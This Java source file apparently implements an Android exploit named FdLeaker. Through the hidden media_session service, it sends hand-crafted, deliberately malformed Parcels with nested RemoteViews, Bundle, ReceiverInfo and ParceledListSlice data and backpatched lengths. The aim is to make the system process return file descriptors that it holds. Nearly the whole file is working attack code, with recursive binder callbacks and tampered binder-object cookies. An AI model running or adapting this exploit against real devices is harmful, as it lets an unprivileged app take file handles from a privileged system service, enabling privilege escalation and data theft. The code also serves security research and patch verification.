package com.example.thisseemswrong;

import static com.example.thisseemswrong.MiscUtils.*;

import android.annotation.SuppressLint;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.os.Binder;
import android.os.Bundle;
import android.os.ConditionVariable;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Parcel;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.text.TextUtils;
import android.util.Log;
import android.widget.RemoteViews;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Objects;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutionException;

@SuppressLint("SoonBlockedPrivateApi")
class FdLeaker {

    // From android.os.Parcel
    private static final int VAL_PARCELABLE = 4; // length-prefixed
    static final int VAL_PARCELABLEARRAY = 16; // length-prefixed
    // from android.os.Bundle
    private static final int BUNDLE_MAGIC = 0x4C444E42; // 'B' 'N' 'D' 'L'
    // From android.widget.RemoteViews
    private static final int REFLECTION_ACTION_TAG = 2;
    // From android.widget.RemoteViews$BaseReflectionAction
    private static final int BASE_REFLECTION_ACTION_BUNDLE = 13;
    // offsetof(struct flat_binder_object, cookie)
    private static final int COOKIE_OFFSET = 16;

    private final Object mMediaSessionInterface;
    private final Method mGetBinderForSetQueue;
    private final IBinder mMediaSessionControllerBinder;
    private final int mMediaSessionControllerGetQueueCode;
    private final ConditionVariable mFinishLeakCond = new ConditionVariable();
    private final ConditionVariable mLeakStartedCond = new ConditionVariable();
    private CompletableFuture<ParcelFileDescriptor[]> mLeakResultRetriever;
    private FdLeakerIteration[] mIterations;

    /*
     * true if system includes commit
     * https://android.googlesource.com/platform/frameworks/base/+/c702bb71811993960debe0c18fcf8834cfa2454f
     */
    private final boolean mParceledListBinderFiltersTypes;

    static class FdLeakerIteration {
        final int mSkipFds;
        final int mGrabFds;
        ParcelFileDescriptor[] mGrabbedFds;

        public FdLeakerIteration(int skipFds, int grabFds) {
            mSkipFds = skipFds;
            mGrabFds = grabFds;
        }
    }

    /**
     * Get service that needs to be passed to constructor
     * <p>
     * May return null if system isn't booted yet
     */
    @Nullable
    static IBinder getSystemMediaSessionService() {
        try {
            return (IBinder) Class.forName("android.os.ServiceManager")
                    .getMethod("getService", String.class)
                    .invoke(null, "media_session");
        } catch (Exception e) {
            return null;
        }
    }

    FdLeaker(IBinder mediaSessionManagerBinder) throws Exception {
        Object mediaSessionManager = Class.forName("android.media.session.ISessionManager$Stub")
                .getMethod("asInterface", IBinder.class)
                .invoke(null, mediaSessionManagerBinder);
        mMediaSessionInterface = mediaSessionManager
                .getClass()
                .getMethod(
                        "createSession",
                        String.class,
                        Class.forName("android.media.session.ISessionCallback"),
                        String.class,
                        Bundle.class,
                        int.class
                )
                .invoke(
                        mediaSessionManager,
                        "com.example.thisseemswrong",
                        Class.forName("android.media.session.ISessionCallback$Stub")
                                .getMethod("asInterface", IBinder.class)
                                .invoke(null, new Binder()),
                        null,
                        null,
                        myUserId()
                );
        mGetBinderForSetQueue = mMediaSessionInterface.getClass().getMethod("getBinderForSetQueue");
        mMediaSessionControllerBinder =
                ((IInterface) mMediaSessionInterface
                        .getClass()
                        .getMethod("getController")
                        .invoke(mMediaSessionInterface)
                ).asBinder();
        Objects.requireNonNull(mMediaSessionControllerBinder);
        Field getQueueCodeField = Class.forName("android.media.session.ISessionController$Stub")
                .getDeclaredField("TRANSACTION_getQueue");
        getQueueCodeField.setAccessible(true);
        mMediaSessionControllerGetQueueCode = getQueueCodeField.getInt(null);

        // Probe filtering of non-QueueItem objects
        {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInt(1); // Queue length
            data.writeInt(1); // Item inline
            data.writeString("android.content.ComponentName");
            data.writeString("");
            data.writeString("");
            getBinderForSetQueue().transact(IBinder.FIRST_CALL_TRANSACTION, data, reply, 0);
            reply.recycle();
            data.recycle();
        }
        {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken("android.media.session.ISessionController");
            mMediaSessionControllerBinder.transact(mMediaSessionControllerGetQueueCode, data, reply, 0);
            reply.readException();
            readIntAndCheck(reply, 1, "PLS != null");
            mParceledListBinderFiltersTypes = reply.readInt() == 0;
            reply.recycle();
            data.recycle();
        }
    }

    @NonNull
    IBinder getBinderForSetQueue() throws IllegalAccessException, InvocationTargetException {
        return (IBinder) mGetBinderForSetQueue.invoke(mMediaSessionInterface);
    }

    static FdLeakerIteration[] buildSingleConfig(int skipFds, int numFds) {
        return new FdLeakerIteration[]{
                new FdLeakerIteration(skipFds, numFds)
        };
    }

    static FdLeakerIteration[] buildStagedConfig(int skipFds, int numFds, int repeats) {
        FdLeakerIteration[] result = new FdLeakerIteration[numFds * repeats];
        for (int r = 0; r < repeats; r++) {
            for (int i = 0; i < numFds; i++) {
                result[r * numFds + i] = new FdLeakerIteration(skipFds + i, 1);
            }
        }
        return result;
    }

    void startLeak(FdLeakerIteration[] iterations) {
        mIterations = iterations;
        mFinishLeakCond.close();
        mLeakStartedCond.close();
        mLeakResultRetriever = new CompletableFuture<>();
        new Thread(() -> {
            try {
                performLeakCall(0);
            } catch (Exception e) {
                Log.e("FdLeaker", "Outermost iteration failed", e);
                mLeakStartedCond.open();
            }
            mLeakResultRetriever.complete(
                    Arrays.stream(mIterations)
                            .filter(i -> i.mGrabbedFds != null && i.mGrabbedFds.length != 0)
                            .flatMap(i -> Arrays.stream(i.mGrabbedFds))
                            .toArray(ParcelFileDescriptor[]::new)
            );
        }).start();
        mLeakStartedCond.block();
    }

    ParcelFileDescriptor[] finishLeak(int holdFdsDuringClose) throws ExecutionException {
        final HoldFds holdFds;
        if (holdFdsDuringClose > 0) {
            holdFds = new HoldFds();
            holdFds.mNumFds = holdFdsDuringClose;
            new Thread(holdFds).start();
            holdFds.mHoldStartCond.block();
        } else {
            holdFds = null;
        }
        mFinishLeakCond.open();
        try {
            return mLeakResultRetriever.get();
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        } finally {
            if (holdFds != null) {
                holdFds.mHoldEndCond.open();
            }
        }
    }

    private void performLeakCall(int iterationIndex) throws ReflectiveOperationException, RemoteException {
        FdLeakerIteration iteration = mIterations[iterationIndex];

        {
            ArrayList<Integer> fdCookiePositions = new ArrayList<>();
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInt(mParceledListBinderFiltersTypes ? 2 : 1); // Queue length
            data.writeInt(1); // Item inline
            data.writeString("android.widget.RemoteViews");
            // BEGIN RemoteViews
            for (int i = 0; i < sIntsInRemoteViewsBeforeAppInfo; i++) {
                // mode = MODE_NORMAL
                // mBitmapCache, mCollectionCache
                data.writeInt(0);
            }
            ApplicationInfo applicationInfo = new ApplicationInfo();
            applicationInfo.packageName = "";
            data.writeTypedObject(applicationInfo, 0);
            data.writeInt(0); // mIdealSize = null
            data.writeInt(0); // mLayoutId
            data.writeInt(0); // mViewId
            data.writeInt(0); // mLightBackgroundLayoutId
            data.writeInt(1); // mActions.size()
            // BEGIN ReflectionAction
            data.writeInt(REFLECTION_ACTION_TAG);
            data.writeInt(0); // mActions.get(0).mViewId
            data.writeInt(-1); // mActions.get(0).mMethodName = null (readString8)
            data.writeInt(BASE_REFLECTION_ACTION_BUNDLE); // mActions.get(0).mType
            // BEGIN Bundle
            data.writeInt(4); // Bundle size
            data.writeInt(BUNDLE_MAGIC);
            data.writeInt(1); // Key-value pair count
            data.writeString("a");
            data.writeInt(VAL_PARCELABLEARRAY);
            int firstLength = data.dataPosition();
            data.writeInt(0); // Placeholder for LazyValue size
            int firstStart = data.dataPosition();
            data.writeInt(mParceledListBinderFiltersTypes ? 2 : 3); // Parcelable[].length
            data.writeString("android.app.ReceiverInfo");
            // BEGIN ReceiverInfo
            int secondStart = data.dataPosition();
            data.writeInt(0); // Placeholder for AIDL length
            data.writeInt(1); // intent != null
            data.appendFrom(sSampleIntentData, 0, sSampleIntentPart1Size);
            /*
            ███████ ████████  █████  ██████  ████████      █████
            ██         ██    ██   ██ ██   ██    ██        ██   ██
            ███████    ██    ███████ ██████     ██        ███████
                 ██    ██    ██   ██ ██   ██    ██        ██   ██
            ███████    ██    ██   ██ ██   ██    ██        ██   ██
            */
            int thirdStart = data.dataPosition(); // mComponent.mPackage
            data.writeInt(0); // mComponent.mPackage String length placeholder
            for (int i = 0; i < iteration.mSkipFds; i++) {
                int pos = data.dataPosition();
                data.writeFileDescriptor(sFillerFile.getFileDescriptor());
                fdCookiePositions.add(pos + COOKIE_OFFSET);
            }
            backpatchLength(data, secondStart, secondStart); // (Return here after finishing segment B)
            data.writeString("android.content.pm.ParceledListSlice");
            // BEGIN ParceledListSlice
            data.writeInt(1);
            data.writeString("android.content.ComponentName");
            data.writeInt(0); // End of inline items
            TriggerCallback triggerCallback = new TriggerCallback();
            triggerCallback.mIterationIndex = iterationIndex + 1;
            data.writeStrongBinder(triggerCallback);
            // END ParceledListSlice
            int fourthLength, fourthStart;
            if (mParceledListBinderFiltersTypes) {
                // BEGIN wrap-up RemoteViews
                backpatchLength(data, firstLength, firstStart);
                data.writeInt(0); // mApplyFlags
                data.writeLong(0); // mProviderInstanceId
                data.writeInt(0); // mHasDrawInstructions
                // END wrap-up RemoteViews
                data.writeInt(1); // Item inline
                data.writeString("android.media.session.MediaSession$QueueItem");
                data.writeString(null); // mMediaId
                TextUtils.writeToParcel(null, data, 0); // mTitle
                TextUtils.writeToParcel(null, data, 0); // mSubtitle
                TextUtils.writeToParcel(null, data, 0); // mDescription
                data.writeString(null); // mIcon
                data.writeString(null); // mUri
                // mExtras
                fourthLength = data.dataPosition();
                data.writeInt(0); // Placeholder for Bundle size
                data.writeInt(BUNDLE_MAGIC);
                fourthStart = data.dataPosition();
            } else {
                data.writeString("android.os.ParcelableParcel");
                // BEGIN ParcelableParcel
                fourthLength = data.dataPosition();
                data.writeInt(0); // Placeholder for ParcelableParcel size
                fourthStart = data.dataPosition();
            }
            for (int i = 0; i < iteration.mGrabFds; i++) {
                int pos = data.dataPosition();
                data.writeFileDescriptor(sFillerFile.getFileDescriptor());
                fdCookiePositions.add(pos + COOKIE_OFFSET);
            }
            backpatchLength(data, fourthLength, fourthStart);
            // END ParcelableParcel
            if (!mParceledListBinderFiltersTypes) {
                // BEGIN wrap-up RemoteViews
                backpatchLength(data, firstLength, firstStart);
                // RemoteViews reads here mApplyFlags, mProviderInstanceId and mHasDrawInstructions,
                // but those will accept anything
            } else {
                data.writeString(null); // mMediaUri
                // MediaSession$QueueItem#mId, but that will accept anything
            }
            // END wrap-up RemoteViews
            /*
            ███████ ███    ██ ██████       █████
            ██      ████   ██ ██   ██     ██   ██
            █████   ██ ██  ██ ██   ██     ███████
            ██      ██  ██ ██ ██   ██     ██   ██
            ███████ ██   ████ ██████      ██   ██
            */
            backpatchLengthString(data, thirdStart); // (Skip over segment A in first pass)
            data.appendFrom(sSampleIntentData, sSampleIntentPart2Start, sSampleIntentPart2Size);
            /*
            ███████ ████████  █████  ██████  ████████     ██████
            ██         ██    ██   ██ ██   ██    ██        ██   ██
            ███████    ██    ███████ ██████     ██        ██████
                 ██    ██    ██   ██ ██   ██    ██        ██   ██
            ███████    ██    ██   ██ ██   ██    ██        ██████
            */
            data.writeInt(BUNDLE_MAGIC);
            data.writeInt(1); // Bundle count
            data.writeString("a");
            data.writeInt(VAL_PARCELABLE);
            data.writeInt(0); // LazyValue length (will skip over check through Exception)
            data.writeString("android.app.ReceiverInfo");
            data.writeInt(Integer.MAX_VALUE); // AIDL length
            data.writeInt(0); // intent = null
            data.writeString(null); // data = null
            data.writeInt(1); // extras != null
            data.writeInt(4); // Bundle size
            data.writeInt(BUNDLE_MAGIC);
            data.writeInt(1); // Bundle count
            data.writeString("a");
            data.writeInt(VAL_PARCELABLE);
            data.writeInt(0); // LazyValue length (will skip over check through Exception)
            data.writeString("android.content.pm.PackageParser$Activity");
            data.writeString(null); // String PackageParser.Component.className = null
            data.writeInt(-1); // String PackageParser.Component.metaData = null
            data.writeInt(1); // createIntentsList() N=1
            data.writeString("android.os.PooledStringWriter"); // Class.forName()
            /*
            ███████ ███    ██ ██████      ██████
            ██      ████   ██ ██   ██     ██   ██
            █████   ██ ██  ██ ██   ██     ██████
            ██      ██  ██ ██ ██   ██     ██   ██
            ███████ ██   ████ ██████      ██████
            */
            for (Integer fdCookiePosition : fdCookiePositions) {
                data.setDataPosition(fdCookiePosition);
                data.writeInt(0);
            }
            getBinderForSetQueue().transact(IBinder.FIRST_CALL_TRANSACTION, data, reply, 0);
            for (Integer fdCookiePosition : fdCookiePositions) {
                data.setDataPosition(fdCookiePosition);
                data.writeInt(1);
            }
            reply.recycle();
            data.recycle();
            if (!triggerCallback.mOnTransactCalled) {
                throw new RuntimeException();
            }
        }

        {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken("android.media.session.ISessionController");
            mMediaSessionControllerBinder.transact(mMediaSessionControllerGetQueueCode, data, reply, 0);
            reply.readException();
            readIntAndCheck(reply, 1, "PLS != null");
            readIntAndCheck(reply, 1, "PLS length");
            if (mParceledListBinderFiltersTypes) {
                readStringAndCheck(reply, "android.media.session.MediaSession$QueueItem", "PLS type");
                readIntAndCheck(reply, 1, "PLS item inline");
                readIntAndCheck(reply, -1, "mMediaId");
                TextUtils.CHAR_SEQUENCE_CREATOR.createFromParcel(reply); // mTitle
                TextUtils.CHAR_SEQUENCE_CREATOR.createFromParcel(reply); // mSubtitle
                TextUtils.CHAR_SEQUENCE_CREATOR.createFromParcel(reply); // mDescription
                readIntAndCheck(reply, -1, "mIcon");
                readIntAndCheck(reply, -1, "mUri");
                reply.readInt(); // Bundle size
                readIntAndCheck(reply, BUNDLE_MAGIC, "BUNDLE_MAGIC");
            } else {
                readStringAndCheck(reply, "android.widget.RemoteViews", "PLS type");
                readIntAndCheck(reply, 1, "PLS item inline");
                for (int i = 0; i < sIntsInRemoteViewsBeforeAppInfo; i++) {
                    readIntAndCheck(reply, 0, "ints-before-AppInfo " + i);
                }
                ApplicationInfo.CREATOR.createFromParcel(reply);
                readIntAndCheck(reply, 0, "mIdealSize == null");
                readIntAndCheck(reply, 0, "mLayoutId");
                readIntAndCheck(reply, 0, "mViewId");
                readIntAndCheck(reply, 0, "mLightBackgroundLayoutId");
                readIntAndCheck(reply, 1, "mActions.size()");
                readIntAndCheck(reply, REFLECTION_ACTION_TAG, "REFLECTION_ACTION_TAG");
                readIntAndCheck(reply, 0, "mActions.get(0).mViewId");
                readIntAndCheck(reply, -1, "mActions.get(0).mMethodName = null (readString8)");
                readIntAndCheck(reply, BASE_REFLECTION_ACTION_BUNDLE, "mActions.get(0).mType");
                reply.readInt(); // Bundle size
                readIntAndCheck(reply, BUNDLE_MAGIC, "BUNDLE_MAGIC");
                readIntAndCheck(reply, 1, "Key-value pair count");
                readStringAndCheck(reply, "a", "Key");
                readIntAndCheck(reply, VAL_PARCELABLEARRAY, "Value type");
                reply.readInt(); // LazyValue size
                readIntAndCheck(reply, 3, "Parcelable[].length");
                readStringAndCheck(reply, "android.app.ReceiverInfo", "Parcelable[0] type");
                int aidlParcelablePos = reply.dataPosition();
                int aidlParcelableSize = reply.readInt();
                if (aidlParcelableSize <= 4 || aidlParcelableSize >= reply.dataAvail()) {
                    throw new RuntimeException("Bad AIDL parcelable size");
                }
                reply.setDataPosition(aidlParcelablePos + aidlParcelableSize);
                readStringAndCheck(reply, "android.content.pm.ParceledListSlice", "Parcelable[1] type");
                readIntAndCheck(reply, 1, "Parcelable[1] PLS length");
                readStringAndCheck(reply, "android.content.ComponentName", "Parcelable[1] PLS type");
                readIntAndCheck(reply, 1, "Parcelable[1] PLS item inline");
                readStringAndCheck(reply, "", "Parcelable[1] ComponentName package");
                readStringAndCheck(reply, "", "Parcelable[1] ComponentName class");
                readStringAndCheck(reply, "android.os.ParcelableParcel", "Parcelable[2] type");
                reply.readInt(); // ParcelableParcel size
            }
            ParcelFileDescriptor[] results = new ParcelFileDescriptor[iteration.mGrabFds];
            for (int i = 0; i < iteration.mGrabFds; i++) {
                results[i] = reply.readFileDescriptor();
            }
            iteration.mGrabbedFds = results;
            reply.recycle();
            data.recycle();
        }
    }

    private class TriggerCallback extends Binder {
        int mIterationIndex;
        boolean mOnTransactCalled;

        @Override
        protected boolean onTransact(int code, @NonNull Parcel data, @Nullable Parcel reply, int flags) throws RemoteException {
            if (code == FIRST_CALL_TRANSACTION) {
                if (!mOnTransactCalled) {
                    mOnTransactCalled = true;
                    try {
                        if (mIterationIndex < mIterations.length) {
                            performLeakCall(mIterationIndex);
                        } else {
                            mLeakStartedCond.open();
                            mFinishLeakCond.block();
                        }
                    } catch (Exception e) {
                        Log.e("FdLeaker", "Nested iteration failed", e);
                    }
                } else {
                    Log.e("FdLeaker", "Unexpected extra PLS onTransact");
                }
                reply.writeNoException();
                reply.writeInt(1);
                reply.writeString("");
                reply.writeString("");
                return true;
            }
            return super.onTransact(code, data, reply, flags);
        }
    }

    private class HoldFds extends Binder implements Runnable {
        ConditionVariable mHoldStartCond = new ConditionVariable();
        ConditionVariable mHoldEndCond = new ConditionVariable();
        int mNumFds;

        @Override
        protected boolean onTransact(int code, @NonNull Parcel data, @Nullable Parcel reply, int flags) throws RemoteException {
            if (code == FIRST_CALL_TRANSACTION) {
                mHoldStartCond.open();
                mHoldEndCond.block();
                reply.writeNoException();
                reply.writeInt(1);
                reply.writeString("");
                reply.writeString("");
                return true;
            }
            return super.onTransact(code, data, reply, flags);
        }

        @Override
        public void run() {
            try {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                data.writeInt(2); // ParcelableListBinder item count
                data.writeInt(1); // ParcelableListBinder item inline
                data.writeString("android.content.pm.ParceledListSlice");
                data.writeInt(1); // ParceledListSlice item count
                data.writeString("android.content.ComponentName");
                data.writeInt(0); // End of ParceledListSlice inline items
                data.writeStrongBinder(this);
                data.writeInt(0); // End of ParcelableListBinder items
                for (int i = 0; i < mNumFds; i++) {
                    data.writeFileDescriptor(sFillerFile.getFileDescriptor());
                }
                getBinderForSetQueue()
                        .transact(FIRST_CALL_TRANSACTION, data, reply, 0);
                reply.recycle();
                data.recycle();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
    }

    /* File descriptor that will be sent within leak transaction */
    private static final ParcelFileDescriptor sFillerFile;

    static {
        try {
            ParcelFileDescriptor[] pipe = ParcelFileDescriptor.createPipe();
            sFillerFile = pipe[0];
            pipe[1].close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    /* Number of writeInt(0) calls at beginning of RemoteViews before ApplicationInfo object */
    private static final int sIntsInRemoteViewsBeforeAppInfo;

    static {
        try {
            Parcel data = Parcel.obtain();
            int[] probeOut = new int[1];
            RemoteViews remoteViews = RemoteViews.class.getDeclaredConstructor(ApplicationInfo.class, int.class).newInstance(new ApplicationInfo() {
                @Override
                public void writeToParcel(Parcel dest, int parcelableFlags) {
                    if (probeOut[0] == 0) {
                        probeOut[0] = dest.dataPosition();
                    }
                    super.writeToParcel(dest, parcelableFlags);
                }
            }, 0);
            remoteViews.writeToParcel(data, 0);
            data.recycle();
            // leading fields exclude the typed object sign
            // per https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/os/Parcel.java;drc=61197364367c9e404c7da6900658f1b16c42d0da;l=2387
            sIntsInRemoteViewsBeforeAppInfo = probeOut[0] / 4 - 1 ;
        } catch (NoSuchMethodException | IllegalAccessException |
                 InstantiationException | InvocationTargetException e) {
            throw new RuntimeException(e);
        }
    }

    /*
     * Parcelled Intent object data and offsets
     * Intent {
     *   { mAction .. mPackage } = .appendFrom(sSampleIntentData, 0, sSampleIntentPart1Size)
     *   { mComponent } = <custom>
     *   { mSourceBounds .. mContentUserHint } = .appendFrom(sSampleIntentData, sSampleIntentPart2Start, sSampleIntentPart2Size)
     *   { mExtras(except Parcel size) .. } = <custom>
     * }
     */
    static final Parcel sSampleIntentData;
    static final int sSampleIntentPart1Size;
    static final int sSampleIntentPart2Start;
    static final int sSampleIntentPart2Size;

    static {
        int probeComponentSize;
        int probeComponentValue;
        ComponentName probeComponent = new ComponentName("ThisIsNameOfComponent", "");
        Intent probeIntent = new Intent();
        probeIntent.setComponent(probeComponent);
        probeIntent.putExtra("a", 1);
        {
            Parcel data = Parcel.obtain();
            probeComponent.writeToParcel(data, 0);
            probeComponentSize = data.dataPosition();
            data.setDataPosition(0);
            probeComponentValue = data.readInt();
            data.recycle();
        }

        sSampleIntentData = Parcel.obtain();
        probeIntent.writeToParcel(sSampleIntentData, 0);
        sSampleIntentData.setDataPosition(0);
        int candidateSampleIntentPart1Size;
        do {
            candidateSampleIntentPart1Size = sSampleIntentData.dataPosition();
        } while (sSampleIntentData.dataAvail() > 0 && sSampleIntentData.readInt() != probeComponentValue);
        sSampleIntentPart1Size = candidateSampleIntentPart1Size;
        sSampleIntentPart2Start = sSampleIntentPart1Size + probeComponentSize;
        sSampleIntentData.setDataPosition(sSampleIntentPart2Start);
        int extraStartPos;
        do {
            extraStartPos = sSampleIntentData.dataPosition();
        } while (sSampleIntentData.dataAvail() > 0 && sSampleIntentData.readInt() != BUNDLE_MAGIC);
        sSampleIntentPart2Size = extraStartPos - sSampleIntentPart2Start;
        if (!(0 < sSampleIntentPart1Size && sSampleIntentPart1Size < sSampleIntentPart2Start && sSampleIntentPart2Size > 0)) {
            throw new RuntimeException();
        }
    }

}
